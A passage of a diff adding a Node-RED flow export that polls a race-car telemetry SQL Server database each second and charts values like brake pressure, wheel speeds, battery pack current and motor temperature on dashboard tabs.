@@ -1,0 +1,3843 @@
+[
+    {
+        "id": "8c02145f70bf7c6a",
+        "type": "tab",
+        "label": "General",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "4a2f2f6c3794d699",
+        "type": "tab",
+        "label": "MC",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "c91b7712e66969da",
+        "type": "tab",
+        "label": "EV Critical",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "54ee7ab52b252314",
+        "type": "tab",
+        "label": "EV_Useful",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "594e9fd18f91cc50",
+        "type": "tab",
+        "label": "EV Other",
+        "disabled": false,
+        "info": "",
+        "env": []
+    },
+    {
+        "id": "933ce03686fddbab",
+        "type": "MSSQL-CN",
+        "tdsVersion": "7_4",
+        "name": "litel SQL Server",
+        "server": "20.81.190.176",
+        "port": "1433",
+        "encyption": true,
+        "trustServerCertificate": true,
+        "database": "Live Telemetry",
+        "useUTC": true,
+        "connectTimeout": "15000",
+        "requestTimeout": "15000",
+        "cancelTimeout": "5000",
+        "pool": "5",
+        "parseJSON": false,
+        "enableArithAbort": true
+    },
+    {
+        "id": "6988e854229f01bb",
+        "type": "ui_tab",
+        "name": "EV_Useful",
+        "icon": "dashboard",
+        "order": 4,
+        "disabled": false,
+        "hidden": false
+    },
+    {
+        "id": "e143306a96f4ee24",
+        "type": "ui_base",
+        "theme": {
+            "name": "theme-dark",
+            "lightTheme": {
+                "default": "#0094CE",
+                "baseColor": "#0094CE",
+                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
+                "edited": true,
+                "reset": false
+            },
+            "darkTheme": {
+                "default": "#097479",
+                "baseColor": "#0433ff",
+                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
+                "edited": true,
+                "reset": false
+            },
+            "customTheme": {
+                "name": "Untitled Theme 1",
+                "default": "#4B7930",
+                "baseColor": "#4B7930",
+                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
+            },
+            "themeState": {
+                "base-color": {
+                    "default": "#097479",
+                    "value": "#0433ff",
+                    "edited": true
+                },
+                "page-titlebar-backgroundColor": {
+                    "value": "#0433ff",
+                    "edited": false
+                },
+                "page-backgroundColor": {
+                    "value": "#111111",
+                    "edited": false
+                },
+                "page-sidebar-backgroundColor": {
+                    "value": "#333333",
+                    "edited": false
+                },
+                "group-textColor": {
+                    "value": "#5071ff",
+                    "edited": false
+                },
+                "group-borderColor": {
+                    "value": "#555555",
+                    "edited": false
+                },
+                "group-backgroundColor": {
+                    "value": "#333333",
+                    "edited": false
+                },
+                "widget-textColor": {
+                    "value": "#eeeeee",
+                    "edited": false
+                },
+                "widget-backgroundColor": {
+                    "value": "#0433ff",
+                    "edited": false
+                },
+                "widget-borderColor": {
+                    "value": "#333333",
+                    "edited": false
+                },
+                "base-font": {
+                    "value": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
+                }
+            },
+            "angularTheme": {
+                "primary": "indigo",
+                "accents": "blue",
+                "warn": "red",
+                "background": "grey",
+                "palette": "light"
+            }
+        },
+        "site": {
+            "name": "Node-RED Dashboard",
+            "hideToolbar": "false",
+            "allowSwipe": "false",
+            "lockMenu": "false",
+            "allowTempTheme": "true",
+            "dateFormat": "DD/MM/YYYY",
+            "sizes": {
+                "sx": 48,
+                "sy": 48,
+                "gx": 6,
+                "gy": 6,
+                "cx": 6,
+                "cy": 6,
+                "px": 0,
+                "py": 0
+            }
+        }
+    },
+    {
+        "id": "0792dde75d0b55e3",
+        "type": "ui_group",
+        "name": "EV_Useful",
+        "tab": "6988e854229f01bb",
+        "order": 1,
+        "disp": true,
+        "width": "32",
+        "collapse": false,
+        "className": ""
+    },
+    {
+        "id": "c46b2c1ea6e37152",
+        "type": "ui_tab",
+        "name": "EV_Critical",
+        "icon": "dashboard",
+        "order": 3,
+        "disabled": false,
+        "hidden": false
+    },
+    {
+        "id": "9f715c58ec97d4b1",
+        "type": "ui_group",
+        "name": "EV_Critical",
+        "tab": "c46b2c1ea6e37152",
+        "order": 1,
+        "disp": true,
+        "width": "30",
+        "collapse": false,
+        "className": ""
+    },
+    {
+        "id": "b5264e960f9eb7eb",
+        "type": "ui_group",
+        "name": "EV_Other",
+        "tab": "de192e18d9a5b7a3",
+        "order": 1,
+        "disp": true,
+        "width": "30",
+        "collapse": false,
+        "className": ""
+    },
+    {
+        "id": "de192e18d9a5b7a3",
+        "type": "ui_tab",
+        "name": "EV_Other",
+        "icon": "dashboard",
+        "order": 5,
+        "disabled": false,
+        "hidden": false
+    },
+    {
+        "id": "c012dff6afbc6486",
+        "type": "ui_tab",
+        "name": "General",
+        "icon": "dashboard",
+        "order": 1,
+        "disabled": false,
+        "hidden": false
+    },
+    {
+        "id": "1fc0dcc2cd8a691a",
+        "type": "ui_group",
+        "name": "General",
+        "tab": "c012dff6afbc6486",
+        "order": 1,
+        "disp": true,
+        "width": "30",
+        "collapse": false,
+        "className": ""
+    },
+    {
+        "id": "a5f2ac06c2cd3214",
+        "type": "ui_tab",
+        "name": "MC",
+        "icon": "dashboard",
+        "order": 2,
+        "disabled": false,
+        "hidden": false
+    },
+    {
+        "id": "4dce402db33a1ac6",
+        "type": "ui_group",
+        "name": "MC",
+        "tab": "a5f2ac06c2cd3214",
+        "order": 1,
+        "disp": true,
+        "width": "30",
+        "collapse": false,
+        "className": ""
+    },
+    {
+        "id": "3f7c505f0970583f",
+        "type": "inject",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "1",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 230,
+        "y": 260,
+        "wires": [
+            [
+                "4ca42c195c0ba79d"
+            ]
+        ]
+    },
+    {
+        "id": "4ca42c195c0ba79d",
+        "type": "MSSQL",
+        "z": "8c02145f70bf7c6a",
+        "mssqlCN": "933ce03686fddbab",
+        "name": "",
+        "outField": "payload",
+        "returnType": 0,
+        "throwErrors": 1,
+        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
+        "modeOpt": "queryMode",
+        "modeOptType": "query",
+        "queryOpt": "payload",
+        "queryOptType": "editor",
+        "paramsOpt": "queryParams",
+        "paramsOptType": "none",
+        "rows": "rows",
+        "rowsType": "msg",
+        "parseMustache": true,
+        "params": [],
+        "x": 420,
+        "y": 260,
+        "wires": [
+            [
+                "a38e33d6cec1d4e3"
+            ]
+        ]
+    },
+    {
+        "id": "a38e33d6cec1d4e3",
+        "type": "function",
+        "z": "8c02145f70bf7c6a",
+        "name": "function 1",
+        "func": "var sigFigs = 2;\n\nvar brake_pressure_front =\n{\n    topic: \"brake_pressure_front\",\n    payload: msg.payload[0].brake_pressure_front\n}\ntry {\n    brake_pressure_front.payload = brake_pressure_front.payload.toFixed(sigFigs)\n} catch { }\n\nvar brake_pressure_rear =\n{\n    topic: \"brake_pressure_rear\",\n    payload: msg.payload[0].brake_pressure_rear\n}\ntry {\n    brake_pressure_rear.payload = brake_pressure_rear.payload.toFixed(sigFigs)\n} catch { }\n\nvar steering_angle =\n{\n    topic: \"steering_angle\",\n    payload: msg.payload[0].steering_angle\n}\ntry {\n    steering_angle.payload = steering_angle.payload.toFixed(sigFigs)\n} catch { }\n\nvar vehicle_speed =\n{\n    topic: \"vehicle_speed\",\n    payload: msg.payload[0].vehicle_speed\n}\ntry {\n    vehicle_speed.payload = vehicle_speed.payload.toFixed(sigFigs)\n} catch { }\n\nvar wheel_speed_front_left =\n{\n    topic: \"wheel_speed_front_left\",\n    payload: msg.payload[0].wheel_speed_front_left\n}\ntry {\n    wheel_speed_front_left.payload = wheel_speed_front_left.payload.toFixed(sigFigs)\n} catch { }\n\nvar wheel_speed_front_right =\n{\n    topic: \"wheel_speed_front_right\",\n    payload: msg.payload[0].wheel_speed_front_right\n}\ntry {\n    wheel_speed_front_right.payload = wheel_speed_front_right.payload.toFixed(sigFigs)\n} catch { }\n\nvar wheel_speed_rear_left =\n{\n    topic: \"wheel_speed_rear_left\",\n    payload: msg.payload[0].wheel_speed_rear_left\n}\ntry {\n    wheel_speed_rear_left.payload = wheel_speed_rear_left.payload.toFixed(sigFigs)\n} catch { }\n\nvar wheel_speed_rear_right =\n{\n    topic: \"wheel_speed_rear_left\",\n    payload: msg.payload[0].wheel_speed_rear_left\n}\ntry {\n    wheel_speed_rear_left.payload = wheel_speed_rear_left.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_current =\n{\n    topic: \"pack_current\",\n    payload: msg.payload[0].pack_current\n}\ntry {\n    pack_current.payload = pack_current.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_current =\n{\n    topic: \"pack_current\",\n    payload: msg.payload[0].pack_current\n}\ntry {\n    pack_current.payload = pack_current.payload.toFixed(sigFigs)\n} catch { }\n\nvar high_temperature =\n{\n    topic: \"high_temperature\",\n    payload: msg.payload[0].high_temperature\n}\ntry {\n    high_temperature.payload = high_temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar low_temperature =\n{\n    topic: \"low_temperature\",\n    payload: msg.payload[0].low_temperature\n}\ntry {\n    low_temperature.payload = low_temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_open_voltage =\n{\n    topic: \"pack_open_voltage\",\n    payload: msg.payload[0].pack_open_voltage\n}\ntry {\n    pack_open_voltage.payload = pack_open_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_amp_hours =\n{\n    topic: \"pack_amp_hours\",\n    payload: msg.payload[0].pack_amp_hours\n}\ntry {\n    pack_amp_hours.payload = pack_amp_hours.payload.toFixed(sigFigs)\n} catch { }\n\nvar failsafe_statuses =\n{\n    topic: \"failsafe_statuses\",\n    payload: msg.payload[0].failsafe_statuses\n}\ntry {\n    failsafe_statuses.payload = failsafe_statuses.payload.toFixed(sigFigs)\n} catch { }\n\nvar inv_motor_speed =\n{\n    topic: \"inv_motor_speed\",\n    payload: msg.payload[0].inv_motor_speed\n}\ntry {\n    inv_motor_speed.payload = inv_motor_speed.payload.toFixed(sigFigs)\n} catch { }\n\nvar inv_motor_temperature =\n{\n    topic: \"inv_motor_temperature\",\n    payload: msg.payload[0].inv_motor_temperature\n}\ntry {\n    inv_motor_temperature.payload = inv_motor_temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar brake_temperature_rear_right =\n{\n    topic: \"brake_temperature_rear_right\",\n    payload: msg.payload[0].brake_temperature_rear_right\n}\ntry {\n    brake_temperature_rear_right.payload = brake_temperature_rear_right.payload.toFixed(sigFigs)\n} catch { }\n\nvar brake_temperature_rear_left =\n{\n    topic: \"brake_temperature_rear_left\",\n    payload: msg.payload[0].brake_temperature_rear_left\n}\ntry {\n    brake_temperature_rear_left.payload = brake_temperature_rear_left.payload.toFixed(sigFigs)\n} catch { }\n\nvar brake_temperature_front_right =\n{\n    topic: \"brake_temperature_front_right\",\n    payload: msg.payload[0].brake_temperature_front_right\n}\ntry {\n    brake_temperature_front_right.payload = brake_temperature_front_right.payload.toFixed(sigFigs)\n} catch { }\n\nvar brake_temperature_front_left =\n{\n    topic: \"brake_temperature_front_left\",\n    payload: msg.payload[0].brake_temperature_front_left\n}\ntry {\n    brake_temperature_front_left.payload = brake_temperature_front_left.payload.toFixed(sigFigs)\n} catch { }\n\nvar inv_torque_feedback =\n{\n    topic: \"inv_torque_feedback\",\n    payload: msg.payload[0].inv_torque_feedback\n}\ntry {\n    inv_torque_feedback.payload = inv_torque_feedback.payload.toFixed(sigFigs)\n} catch { }\n\nvar inv_commanded_torque =\n{\n    topic: \"inv_commanded_torque\",\n    payload: msg.payload[0].inv_commanded_torque\n}\ntry {\n    inv_commanded_torque.payload = inv_commanded_torque.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    brake_pressure_front,\n    brake_pressure_rear,\n    steering_angle,\n    vehicle_speed,\n    wheel_speed_front_left,\n    wheel_speed_front_right,\n    wheel_speed_rear_left,\n    wheel_speed_rear_right,\n    pack_current,\n    high_temperature,\n    low_temperature,\n    pack_open_voltage,\n    pack_amp_hours,\n    failsafe_statuses,\n    inv_motor_speed,\n    inv_motor_temperature,\n    brake_temperature_rear_right,\n    brake_temperature_rear_left,\n    brake_temperature_front_right,\n    brake_temperature_front_left,\n    inv_torque_feedback,\n    inv_commanded_torque\n];",
+        "outputs": 22,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 640,
+        "y": 260,
+        "wires": [
+            [
+                "7372b0c8375233ab"
+            ],
+            [
+                "7372b0c8375233ab"
+            ],
+            [
+                "5c7a52acfb042f7d"
+            ],
+            [
+                "d89b58f5a5f64d45"
+            ],
+            [
+                "e1adf8a1a4817986"
+            ],
+            [
+                "e1adf8a1a4817986"
+            ],
+            [
+                "59f0372f8bbdacfb"
+            ],
+            [
+                "59f0372f8bbdacfb"
+            ],
+            [
+                "77a4d0f2c7b4e0f6"
+            ],
+            [
+                "454658aa5a0083f5"
+            ],
+            [
+                "454658aa5a0083f5"
+            ],
+            [
+                "e417df67833a0d17"
+            ],
+            [
+                "c5bd1b62ea3bf354"
+            ],
+            [
+                "7829c2378222bdef"
+            ],
+            [
+                "3e39d2ca77253c9e"
+            ],
+            [
+                "0bf6cbe78b4de339"
+            ],
+            [
+                "6c6a4e4d20debb6d"
+            ],
+            [
+                "6c6a4e4d20debb6d"
+            ],
+            [
+                "c922b91536e0ce56"
+            ],
+            [
+                "c922b91536e0ce56"
+            ],
+            [
+                "f8f0139fcaf8d9e6"
+            ],
+            [
+                "f2c11678b365e4bd"
+            ]
+        ]
+    },
+    {
+        "id": "7372b0c8375233ab",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 10,
+        "width": "6",
+        "height": "6",
+        "label": "Brake Pressure",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 860,
+        "y": 100,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "5c7a52acfb042f7d",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 15,
+        "width": "6",
+        "height": "6",
+        "label": "Steering Angle",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 860,
+        "y": 140,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "d89b58f5a5f64d45",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 5,
+        "width": "6",
+        "height": "6",
+        "label": "Vehicle Speed",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 860,
+        "y": 180,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "e1adf8a1a4817986",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 8,
+        "width": "6",
+        "height": "6",
+        "label": "Front Wheel Speed",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 870,
+        "y": 220,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "59f0372f8bbdacfb",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 7,
+        "width": "6",
+        "height": "6",
+        "label": "Rear Wheel Speed",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 870,
+        "y": 260,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "77a4d0f2c7b4e0f6",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 2,
+        "width": "6",
+        "height": "6",
+        "label": "Pack Current",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 850,
+        "y": 300,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "454658aa5a0083f5",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 3,
+        "width": "6",
+        "height": "6",
+        "label": "High/Low Battery Temps",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 890,
+        "y": 340,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "e417df67833a0d17",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 1,
+        "width": "6",
+        "height": "6",
+        "label": "Pack Open Voltage",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 870,
+        "y": 380,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "c5bd1b62ea3bf354",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 4,
+        "width": "6",
+        "height": "6",
+        "label": "Pack Amp Hours",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 870,
+        "y": 420,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "3e39d2ca77253c9e",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 6,
+        "width": "6",
+        "height": "6",
+        "label": "Motor Speed",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 850,
+        "y": 500,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "0bf6cbe78b4de339",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 9,
+        "width": "6",
+        "height": "6",
+        "label": "Motor Temp",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 850,
+        "y": 540,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "c922b91536e0ce56",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 11,
+        "width": "6",
+        "height": "6",
+        "label": "Front Brake Temps",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 870,
+        "y": 580,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "6c6a4e4d20debb6d",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 12,
+        "width": "6",
+        "height": "6",
+        "label": "Rear Brake Temps",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 870,
+        "y": 620,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "f8f0139fcaf8d9e6",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 13,
+        "width": "6",
+        "height": "6",
+        "label": "Torque Feedback",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 870,
+        "y": 660,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "f2c11678b365e4bd",
+        "type": "ui_chart",
+        "z": "8c02145f70bf7c6a",
+        "name": "",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 14,
+        "width": "6",
+        "height": "6",
+        "label": "Command Torque",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 870,
+        "y": 700,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "7829c2378222bdef",
+        "type": "ui_text",
+        "z": "8c02145f70bf7c6a",
+        "group": "1fc0dcc2cd8a691a",
+        "order": 16,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "Failsafe Statuses",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 870,
+        "y": 460,
+        "wires": []
+    },
+    {
+        "id": "997fd29f83a786ce",
+        "type": "inject",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "1",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 130,
+        "y": 260,
+        "wires": [
+            [
+                "5971fbcb26caa811"
+            ]
+        ]
+    },
+    {
+        "id": "5971fbcb26caa811",
+        "type": "MSSQL",
+        "z": "4a2f2f6c3794d699",
+        "mssqlCN": "933ce03686fddbab",
+        "name": "",
+        "outField": "payload",
+        "returnType": 0,
+        "throwErrors": 1,
+        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
+        "modeOpt": "queryMode",
+        "modeOptType": "query",
+        "queryOpt": "payload",
+        "queryOptType": "editor",
